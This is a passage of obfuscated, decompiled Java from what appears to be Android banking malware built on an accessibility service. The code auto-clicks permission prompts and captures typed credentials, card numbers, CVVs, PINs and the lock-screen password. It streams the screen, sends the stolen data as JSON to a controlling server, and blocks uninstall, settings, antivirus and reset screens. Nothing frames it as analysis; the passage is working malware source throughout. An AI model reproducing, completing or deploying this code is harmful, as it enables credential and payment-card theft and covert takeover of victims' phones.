            if (accessibilityNodeInfo.isClickable() && (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("00260078004F008200E2"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.checked("047D042C"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, "ok", false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("0027007900550082"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.checked("04700428047904D904A204E1"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase2, TypefaceCache.obtain("00260078004F008200E2"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase2, TypefaceCache.checked("047C0428040F04A504A204EA04F204F3047B04540477"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase3, TypefaceCache.obtain("00260078004F008200E2"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase3, TypefaceCache.obtain("002000790055008100F900AD00DF"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase3, TypefaceCache.obtain("003000630059008A00F900AB"), false))) {
                return AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    AccessibilityNodeInfo accessibilityNodeInfoGIIiyi2ddlMDR0 = gIIiyi2ddlMDR0(child, i + 1);
                    if (accessibilityNodeInfoGIIiyi2ddlMDR0 != null) {
                        child.recycle();
                        return accessibilityNodeInfoGIIiyi2ddlMDR0;
                    }
                    child.recycle();
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    public static AccessibilityNodeInfo gmNWMfvn6zlEj(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        if (i > 15) {
            return null;
        }
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            if (accessibilityNodeInfo.isEditable() && (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("000600720052009300C400BA00CA00B3"), true) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("001300770048009400E700B000C000A3001700730043009300C600B600D700B0"), true))) {
                return AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    AccessibilityNodeInfo accessibilityNodeInfoGmNWMfvn6zlEj = gmNWMfvn6zlEj(child, i + 1);
                    if (accessibilityNodeInfoGmNWMfvn6zlEj != null) {
                        child.recycle();
                        return accessibilityNodeInfoGmNWMfvn6zlEj;
                    }
                    child.recycle();
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    public static void hV4VTKNUdeHN(String str, String str2, String str3, String str4) {
        String strPPWVWMPAUcr9AGNUSxQ;
        if (str2.length() < (-4) + 6) {
            return;
        }
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null || (strPPWVWMPAUcr9AGNUSxQ = dataQFAdapter.resolveAppName(str)) == null) {
            strPPWVWMPAUcr9AGNUSxQ = KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(str, str);
        }
        try {
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002100770055008C00CF00BC00C000A2002700490058008600E000AB00C700B500260072"));
                jSONObject.put(TypefaceCache.obtain("003300770058008C00F100B800D7"), str);
                jSONObject.put(TypefaceCache.obtain("00220066004B00B800FE00BE00DF00A2"), strPPWVWMPAUcr9AGNUSxQ);
                jSONObject.put(TypefaceCache.obtain("0025007F005E008B00F4008000C600BE00330073"), str3);
                jSONObject.put(TypefaceCache.obtain("00200077004F008200F700B000C000BE"), TypefaceCache.obtain("003300770048009400E700B000C000A3"));
                jSONObject.put(TypefaceCache.obtain("002B007F00550093"), str4);
                jSONObject.put(TypefaceCache.obtain("002A00650064009700F100AC00C100B0002C0064005F"), true);
                jSONObject.put(TypefaceCache.obtain("0037007300430093"), str2);
                jSONObject.put(TypefaceCache.obtain("0037007F0056008200E300AB00D300AA0033"), System.currentTimeMillis());
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
            }
        } catch (Exception unused) {
        }
    }

    public static JSONObject hjneShqpF9Tis4() throws JSONException {
        String string;
        JSONObject jSONObject = new JSONObject();
        try {
            DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
            if (dataQFAdapter == null) {
                return jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D00790064009400F500AD00C400AE00200073"));
            }
            AccessibilityNodeInfo rootInActiveWindow = dataQFAdapter.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("002D00790064009500FF00B000C6"));
            }
            try {
                CharSequence packageName = rootInActiveWindow.getPackageName();
                if (packageName == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                jSONObject.put(TypefaceCache.obtain("003300770058008C00F100B800D7"), string);
                JSONArray jSONArray = new JSONArray();
                D5P1xCAyuvgF(rootInActiveWindow, jSONArray, 0);
                jSONObject.put(TypefaceCache.obtain("002D0079005F008200E3"), jSONArray);
                jSONObject.put(TypefaceCache.obtain("00200079004E008900E4"), jSONArray.length());
            } finally {
                try {
                    rootInActiveWindow.recycle();
                } catch (Throwable unused) {
                }
            }
        } catch (Throwable th) {
            String strObtain = TypefaceCache.obtain("002600640049008800E2");
            String message = th.getMessage();
            if (message == null) {
                message = TypefaceCache.obtain("003600780050008900FF00A800DC");
            }
            jSONObject.put(strObtain, message);
        }
        return jSONObject;
    }

    public static boolean iUQk66nAiXgO35() {
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            return false;
        }
        yI1KTRoNlsjx realScreenSize = dataQFAdapter.getRealScreenSize();
        int iIntValue = ((Number) realScreenSize.w9sT1Swbhx3hs).intValue();
        int iIntValue2 = ((Number) realScreenSize.vekpFI4d1Nc4fakF).intValue();
        int i = iIntValue / 2;
        int i2 = iIntValue2 / 4;
        int i3 = (iIntValue2 * 3) / 4;
        DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
        if (dataQFAdapter2 != null) {
            return dataQFAdapter2.performSwipe(i, i2, i, i3, 300L);
        }
        return false;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v4, types: [boolean, int] */
    public static void is7XW2V21HfKv7MihWy() {
        String unused = DataQFAdapter.TAG;
        TypefaceCache.obtain("00300062005A009500E4008C00D100B500260073005500B400E400AD00D700A6002E00360058008600FC00B300D700A3006F0036005300D500A600EB008F");
        boolean unused2 = DataQFAdapter.useH264;
        TypefaceCache.obtain("006F00360048009300E200BA00D300AA002A0078005C00DA");
        boolean unused3 = DataQFAdapter.isScreenStreaming;
        if (DataQFAdapter.isScreenStreaming) {
            return;
        }
        ?? r0 = 93 - 92;
        DataQFAdapter.isScreenStreaming = r0;
        DataQFAdapter.h264CaptureInFlight = false;
        DataQFAdapter.lastCaptureTsMs = 0L;
        if (DataQFAdapter.useH264) {
            DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
            if (dataQFAdapter == null) {
                return;
            }
            yI1KTRoNlsjx realScreenSize = dataQFAdapter.getRealScreenSize();
            float fIntValue = ((Number) realScreenSize.vekpFI4d1Nc4fakF).intValue() / ((Number) realScreenSize.w9sT1Swbhx3hs).intValue();
            int i = DataQFAdapter.streamWidth;
            int i2 = (int) (i * fIntValue);
            int i3 = i2 - (i2 % 2);
            lLybWDNhgEj7LwIe llybwdnhgej7lwie = new lLybWDNhgEj7LwIe(i, i3);
            AtomicBoolean atomicBoolean = llybwdnhgej7lwie.vekpFI4d1Nc4fakF;
            if (!atomicBoolean.get()) {
                try {
                    MediaFormat mediaFormatCreateVideoFormat = MediaFormat.createVideoFormat("video/avc", i, i3);
                    mediaFormatCreateVideoFormat.setInteger("bitrate", 800000);
                    mediaFormatCreateVideoFormat.setInteger("frame-rate", 15);
                    mediaFormatCreateVideoFormat.setInteger("i-frame-interval", 2);
                    mediaFormatCreateVideoFormat.setInteger("color-format", 2130708361);
                    mediaFormatCreateVideoFormat.setInteger("profile", r0);
                    mediaFormatCreateVideoFormat.setInteger("level", 512);
                    MediaCodec mediaCodecCreateEncoderByType = MediaCodec.createEncoderByType("video/avc");
                    mediaCodecCreateEncoderByType.configure(mediaFormatCreateVideoFormat, (Surface) null, (MediaCrypto) null, (int) r0);
                    llybwdnhgej7lwie.w9sT1Swbhx3hs = mediaCodecCreateEncoderByType.createInputSurface();
                    mediaCodecCreateEncoderByType.start();
                    llybwdnhgej7lwie.dDIMxZXP1V8HdM = mediaCodecCreateEncoderByType;
                    atomicBoolean.set(r0);
                    Thread thread = new Thread(new hzCVl0f866ksvpzUUql(11, llybwdnhgej7lwie), TypefaceCache.obtain("002B00610016008200FE00BC009F00A30031007700520089"));
                    llybwdnhgej7lwie.JXn4Qf7zpnLjP5 = thread;
                    thread.start();
                    TypefaceCache.obtain("00100062005A009500E400BA00D600E7");
                    TypefaceCache.obtain("00630056001B");
                    TypefaceCache.obtain("00280074004B009400BC00FF");
                    TypefaceCache.obtain("002500660048");
                } catch (Exception e) {
                    TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300F100AD00C600E7002600780058008800F400BA00C000FD0063");
                    e.getMessage();
                    String unused4 = DataQFAdapter.TAG;
                    TypefaceCache.obtain("000B0038000900D100A400FF00D700A900200079005F008200E200FF00D400A6002A007A005E008300BC00FF00D400A6002F007A0052008900F700FF00D000A60020007D001B009300FF00FF00E5008200010046");
                    DataQFAdapter.useH264 = false;
                }
            }
            DataQFAdapter.hwEncoder = llybwdnhgej7lwie;
            String unused5 = DataQFAdapter.TAG;
            TypefaceCache.obtain("000B0038000900D100A400FF00D700A900200079005F008200E200FF00C100B300220064004F008200F400FF");
            TypefaceCache.obtain("0063003E0049008200F100B3009200B400200064005E008200FE00FF");
        }
        new Thread(new jdOQeRk37T35X5xKW1P(6)).start();
    }

    public static void jdOQeRk37T35X5xKW1P() {
        DataQFAdapter.passwordPollerActive = true;
        DataQFAdapter.lockPasswordBuffer.setLength(0);
        DataQFAdapter.lockPasswordTime = System.currentTimeMillis();
        try {
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw != null) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003300770048009400E700B000C000A3001C0075005A009700E400AA00C000A2001C0065004F008600E400AA00C1"));
                jSONObject.put(TypefaceCache.obtain("00300062005A009300E500AC"), TypefaceCache.obtain("00220075004F008E00E600BA"));
                jSONObject.put(TypefaceCache.obtain("002E00730048009400F100B800D7"), TypefaceCache.checked("04540426047E04D504A0049D009204F804730456040504DC04DF00FF048204FD0401042E040904D204AD00FF20A600E7047D0420040304D304A004E2048A04F200630424040904D904A404EF009C00E9006D"));
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
            }
        } catch (Exception unused) {
        }
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new KOlCcQzLUe3LIFgQyuVD(handler), 100L);
    }

    /* JADX WARN: Type inference fix 'apply assigned field type' failed
    java.lang.UnsupportedOperationException: ArgType.getObject(), call class: class jadx.core.dex.instructions.args.ArgType$UnknownArg
    	at jadx.core.dex.instructions.args.ArgType.getObject(ArgType.java:596)
    	at jadx.core.dex.attributes.nodes.ClassTypeVarsAttr.getTypeVarsMapFor(ClassTypeVarsAttr.java:35)
    	at jadx.core.dex.nodes.utils.TypeUtils.replaceClassGenerics(TypeUtils.java:177)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.insertExplicitUseCast(FixTypesVisitor.java:397)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryFieldTypeWithNewCasts(FixTypesVisitor.java:359)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.applyFieldType(FixTypesVisitor.java:309)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:94)
     */
    public static void k84rwRrqzhrNQ1CdNQ9() {
        try {
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw == null) {
                return;
            }
            JSONArray jSONArray = new JSONArray();
            for (Map.Entry entry : DataQFAdapter.pinCaptureAppNames.entrySet()) {
                String str = (String) entry.getKey();
                String str2 = (String) entry.getValue();
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("003300770058008C00F100B800D7"), str);
                jSONObject.put(TypefaceCache.obtain("002D007700560082"), str2);
                jSONObject.put(TypefaceCache.obtain("00260078005A008500FC00BA00D6"), okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(DataQFAdapter.pinCaptureEnabled.get(str), Boolean.TRUE));
                jSONArray.put(jSONObject);
            }
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("0033007F005500B800F300BE00C200B300360064005E00B800F100AF00C200B4"));
            jSONObject2.put(TypefaceCache.obtain("00220066004B0094"), jSONArray);
            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject2);
        } catch (Throwable unused) {
        }
    }

    /* JADX WARN: Type inference failed for: r0v8, types: [boolean, int] */
    public static boolean l1V0lQr6TbwNKqHfXNbb() {
        if (!DataQFAdapter.antiUninstallEnabled || System.currentTimeMillis() < DataQFAdapter.protectionBypassUntil) {
            return false;
        }
        if (DataQFAdapter.serviceStartTime <= 0 || System.currentTimeMillis() - DataQFAdapter.serviceStartTime >= 60000) {
            return 50 - 49;
        }
        return false;
    }

    public static boolean nQilHWaqS401ZtR() {
        return DataQFAdapter.antiUninstallEnabled;
    }

    public static void pyu8ovAipBTLYAiKab(String str) {
        try {
            iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
            RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
            if (rWY6BVSB0XxPbw == null) {
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002700730059009200F7008000DE00A80024"));
            jSONObject.put(TypefaceCache.obtain("002E00730048009400F100B800D7"), str);
            jSONObject.put(TypefaceCache.obtain("0037007F0056008200E300AB00D300AA0033"), System.currentTimeMillis());
            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
        } catch (Throwable unused) {
        }
    }

    public static void qfTrc75xwRVMl85vh() {
        DataQFAdapter.useH264 = false;
    }

    public static boolean t9CXKrwDxrnFA6g23hZU(String str) {
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter == null) {
            return false;
        }
        if (str == null) {
            str = DataQFAdapter.capturedPassword;
        }
        if (str.length() == 0) {
            return false;
        }
        new Thread(new PbcIoTfr9OdE(dataQFAdapter, str, 3)).start();
        return true;
    }

    public static void tne6mXOUFKdd(JSONObject jSONObject) {
        if (jSONObject.has(TypefaceCache.obtain("0030007E005A008300F5"))) {
            DataQFAdapter.UIBlock_Shade = jSONObject.optBoolean(TypefaceCache.obtain("0030007E005A008300F5"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("00300073004F0093"))) {
            DataQFAdapter.UIBlock_Sett = jSONObject.optBoolean(TypefaceCache.obtain("00300073004F0093"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("00220027000A009E"))) {
            DataQFAdapter.UIBlock_A11y = jSONObject.optBoolean(TypefaceCache.obtain("00220027000A009E"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("00330079004C008200E2"))) {
            DataQFAdapter.UIBlock_Power = jSONObject.optBoolean(TypefaceCache.obtain("00330079004C008200E2"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("0036007800520089"))) {
            DataQFAdapter.UIBlock_Unin = jSONObject.optBoolean(TypefaceCache.obtain("0036007800520089"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("002C00610055008600E000AF"))) {
            DataQFAdapter.UIBlock_OwnApp = jSONObject.optBoolean(TypefaceCache.obtain("002C00610055008600E000AF"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("0033007A005A009E"))) {
            DataQFAdapter.UIBlock_Play = jSONObject.optBoolean(TypefaceCache.obtain("0033007A005A009E"), true);
        }
        if (jSONObject.has("av")) {
            DataQFAdapter.UIBlock_AV = jSONObject.optBoolean("av", true);
        }
        if (jSONObject.has(TypefaceCache.obtain("002100640054009000E300BA00C0"))) {
            DataQFAdapter.UIBlock_Browser = jSONObject.optBoolean(TypefaceCache.obtain("002100640054009000E300BA00C0"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("0025007F0057008200E3"))) {
            DataQFAdapter.UIBlock_Files = jSONObject.optBoolean(TypefaceCache.obtain("0025007F0057008200E3"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("003100730048008200E4"))) {
            DataQFAdapter.UIBlock_Reset = jSONObject.optBoolean(TypefaceCache.obtain("003100730048008200E4"), true);
        }
        if (jSONObject.has(TypefaceCache.obtain("00270073004D"))) {
            DataQFAdapter.UIBlock_Dev = jSONObject.optBoolean(TypefaceCache.obtain("00270073004D"), false);
        }
        if (jSONObject.has(TypefaceCache.obtain("002D0073004F"))) {
            DataQFAdapter.UIBlock_Net = jSONObject.optBoolean(TypefaceCache.obtain("002D0073004F"), false);
        }
        if (jSONObject.has(TypefaceCache.obtain("003100730058008200FE00AB00C1"))) {
            DataQFAdapter.UIBlock_Recents = jSONObject.optBoolean(TypefaceCache.obtain("003100730058008200FE00AB00C1"), false);
        }
        if (jSONObject.has(TypefaceCache.obtain("002F00790058008C"))) {
            DataQFAdapter.UIBlock_Lock = jSONObject.optBoolean(TypefaceCache.obtain("002F00790058008C"), true);
        }
        DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
        if (dataQFAdapter != null) {
            dataQFAdapter.saveUiBlockPrefs();
        }
    }

    /* JADX WARN: Code duplicated, block: B:105:0x021c A[EDGE_INSN: B:105:0x021c->B:108:0x022c BREAK  A[LOOP:3: B:74:0x0182->B:78:0x0193]] */
    /* JADX WARN: Code duplicated, block: B:106:0x0221  */
    /* JADX WARN: Code duplicated, block: B:107:0x0226  */
    /* JADX WARN: Code duplicated, block: B:58:0x0133  */
    /* JADX WARN: Code duplicated, block: B:68:0x016c  */
    /* JADX WARN: Code duplicated, block: B:70:0x0170  */
    public static void vIJudZvPyTuNp(String str, String str2, String str3, String str4, boolean z) {
        String strObtain;
        String strPPWVWMPAUcr9AGNUSxQ;
        DataQFAdapter dataQFAdapter;
        Handler handler;
        Object objPutIfAbsent;
        if (DataQFAdapter.grabberPackages.contains(str) && str2.length() >= 2) {
            String strReplaceAll = Pattern.compile(TypefaceCache.obtain("00180048000B00CA00A90082")).matcher(str2).replaceAll("");
            String lowerCase = str4.toLowerCase(Locale.ROOT);
            String string = KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(str2).toString();
            int length = strReplaceAll.length();
            if (13 <= length && length < 20 && yTljMGnIibTRdOpSh4(strReplaceAll)) {
                strObtain = TypefaceCache.obtain("0020007700490083");
            } else if (DataQFAdapter.RE_CARD.w9sT1Swbhx3hs(string) && yTljMGnIibTRdOpSh4(string)) {
                strObtain = TypefaceCache.obtain("0020007700490083");
            } else {
                String[] strArr = DataQFAdapter.KW_CVV;
                int length2 = strArr.length;
                int i = 0;
                while (true) {
                    if (i < length2) {
                        if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, strArr[i], false)) {
                            i++;
                        } else if (DataQFAdapter.RE_CVV.w9sT1Swbhx3hs(string)) {
                            strObtain = TypefaceCache.obtain("00200060004D");
                        }
                    }
                    int length3 = strReplaceAll.length();
                    if (3 <= length3 && length3 < 5) {
                        String[] strArr2 = DataQFAdapter.KW_CVV;
                        int length4 = strArr2.length;
                        int i2 = 0;
                        while (true) {
                            if (i2 < length4) {
                                if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, strArr2[i2], false)) {
                                    strObtain = TypefaceCache.obtain("00200060004D");
                                } else {
                                    i2++;
                                }
                            } else if (Pattern.compile(TypefaceCache.obtain("001F0072004000D500ED0084009D009B006E0038006600BB00F400A4008000EB0077006B")).matcher(str2).matches()) {
                                strObtain = TypefaceCache.obtain("0026006E004B008E00E200A6");
                            } else {
                                strObtain = TypefaceCache.obtain("0026006E004B008E00E200A6");
                            }
                        }
                    } else if (Pattern.compile(TypefaceCache.obtain("001F0072004000D500ED0084009D009B006E0038006600BB00F400A4008000EB0077006B")).matcher(str2).matches() || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("0026006E004B008E00E2"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.checked("04020456040504DD"), false)) {
                        strObtain = TypefaceCache.obtain("0026006E004B008E00E200A6");
                    } else if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str3, TypefaceCache.obtain("0033007F0055")) && !okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str3, TypefaceCache.obtain("0033007F005500B800E000BE00D6"))) {
                        String[] strArr3 = DataQFAdapter.KW_PASSWORD;
                        int length5 = strArr3.length;
                        int i3 = 0;
                        while (true) {
                            if (i3 < length5) {
                                if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, strArr3[i3], false)) {
                                    i3++;
                                } else if (DataQFAdapter.RE_PIN.w9sT1Swbhx3hs(string)) {
                                    strObtain = TypefaceCache.obtain("0033007F0055");
                                }
                            }
                            if (!DataQFAdapter.RE_PIN.w9sT1Swbhx3hs(string)) {
                                if (!z) {
                                    strObtain = TypefaceCache.obtain("003300770048009400E700B000C000A3");
                                } else {
                                    strObtain = TypefaceCache.obtain("003300770048009400E700B000C000A3");
                                }
                            } else if (!z) {
                                strObtain = TypefaceCache.obtain("003300770048009400E700B000C000A3");
                            } else {
                                strObtain = TypefaceCache.obtain("003300770048009400E700B000C000A3");
                            }
                        }
                    } else if (DataQFAdapter.RE_PIN.w9sT1Swbhx3hs(string)) {
                        strObtain = TypefaceCache.obtain("0033007F0055");
                    } else if (!DataQFAdapter.RE_PIN.w9sT1Swbhx3hs(string) && (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("0033007F0055"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.checked("047C042E0406"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.checked("04790428040F"), false))) {
                        strObtain = TypefaceCache.obtain("0033007F0055");
                    } else if (!z && !okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str3, TypefaceCache.obtain("003300770048009400E700B000C000A3"))) {
                        String[] strArr4 = DataQFAdapter.KW_PASSWORD;
                        int length6 = strArr4.length;
                        int i4 = 0;
                        while (true) {
                            if (i4 >= length6) {
                                if (!DataQFAdapter.RE_PHONE.w9sT1Swbhx3hs(string)) {
                                    String[] strArr5 = DataQFAdapter.KW_LOGIN;
                                    int length7 = strArr5.length;
                                    int i5 = 0;
                                    while (true) {
                                        if (i5 < length7) {
                                            String str5 = strArr5[i5];
                                            if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str5, TypefaceCache.obtain("0033007E0054008900F5")) && !okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str5, TypefaceCache.checked("04010423040004D204D404E1048F"))) {
                                                i5++;
                                            } else if (DataQFAdapter.RE_PHONE.w9sT1Swbhx3hs(string)) {
                                                strObtain = TypefaceCache.obtain("0033007E0054008900F5");
                                                break;
                                            }
                                        }
                                        String[] strArr6 = DataQFAdapter.KW_LOGIN;
                                        int length8 = strArr6.length;
                                        int i6 = 0;
                                        while (true) {
                                            if (i6 >= length8) {
                                                String[] strArr7 = DataQFAdapter.KW_CARD;
                                                int length9 = strArr7.length;
                                                int i7 = 0;
                                                while (true) {
                                                    if (i7 >= length9) {
                                                        strObtain = TypefaceCache.obtain("002A0078004B009200E4");
                                                        break;
                                                    } else {
                                                        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, strArr7[i7], false)) {
                                                            strObtain = TypefaceCache.obtain("0020007700490083");
                                                            break;
                                                        }
                                                        i7++;
                                                    }
                                                }
                                            } else {
                                                if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, strArr6[i6], false)) {
                                                    strObtain = TypefaceCache.obtain("002F0079005C008E00FE");
                                                    break;
                                                }
                                                i6++;
                                            }
                                        }
                                    }
                                } else {
                                    strObtain = TypefaceCache.obtain("0033007E0054008900F5");
                                    break;
                                }
                            } else {
                                if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, strArr4[i4], false)) {
                                    strObtain = TypefaceCache.obtain("003300770048009400E700B000C000A3");
                                    break;
                                }
                                i4++;
                            }
                        }
                    } else {
                        strObtain = TypefaceCache.obtain("003300770048009400E700B000C000A3");
                    }
                }
            }
            ConcurrentHashMap concurrentHashMap = DataQFAdapter.capturedCreds;
            Object arrayList = concurrentHashMap.get(str);
            if (arrayList == null && (objPutIfAbsent = concurrentHashMap.putIfAbsent(str, (arrayList = new ArrayList()))) != null) {
                arrayList = objPutIfAbsent;
            }
            List list = (List) arrayList;
            String str6 = strObtain + ": " + str2;
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(list.isEmpty() ? null : list.get(list.size() - 1), str6)) {
                return;
            }
            list.add(str6);
            if (list.size() > 50) {
                list.remove(0);
            }
            DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
            if (dataQFAdapter2 == null || (strPPWVWMPAUcr9AGNUSxQ = dataQFAdapter2.resolveAppName(str)) == null) {
                strPPWVWMPAUcr9AGNUSxQ = KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(str, str);
            }
            String unused = DataQFAdapter.TAG;
            TypefaceCache.obtain("000100770055008C00B000BC00C000A200270036005D009500FF00B20092");
            TypefaceCache.obtain("006300750053008600E200AC009B");
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strObtain, TypefaceCache.obtain("0033007F0055")) && (dataQFAdapter = DataQFAdapter.instance) != null && (handler = dataQFAdapter.handler) != null) {
                handler.post(new jdOQeRk37T35X5xKW1P(3));
            }
            try {
                iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                if (rWY6BVSB0XxPbw != null) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002100770055008C00CF00BC00C000A2002700490058008600E000AB00C700B500260072"));
                    jSONObject.put(TypefaceCache.obtain("003300770058008C00F100B800D7"), str);
                    jSONObject.put(TypefaceCache.obtain("00220066004B00B800FE00BE00DF00A2"), strPPWVWMPAUcr9AGNUSxQ);
                    jSONObject.put(TypefaceCache.obtain("0025007F005E008B00F4008000C600BE00330073"), str3);
                    jSONObject.put(TypefaceCache.obtain("00200077004F008200F700B000C000BE"), strObtain);
                    jSONObject.put(TypefaceCache.obtain("002B007F00550093"), str4);
                    jSONObject.put(TypefaceCache.obtain("002A00650064009700F100AC00C100B0002C0064005F"), z);
                    jSONObject.put(TypefaceCache.obtain("0037007300430093"), str2);
                    jSONObject.put(TypefaceCache.obtain("0037007F0056008200E300AB00D300AA0033"), System.currentTimeMillis());
                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
                }
            } catch (Exception unused2) {
            }
        }
    }

    public static void vekpFI4d1Nc4fakF(String str) {
        if (DataQFAdapter.lockScreenPackages.contains(str) && DataQFAdapter.capturedPassword.length() <= 0 && !DataQFAdapter.passwordPollerActive) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - DataQFAdapter.lastPasswordCheck < 3000) {
                return;
            }
            DataQFAdapter.lastPasswordCheck = jCurrentTimeMillis;
            DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
            if (dataQFAdapter == null) {
                return;
            }
            try {
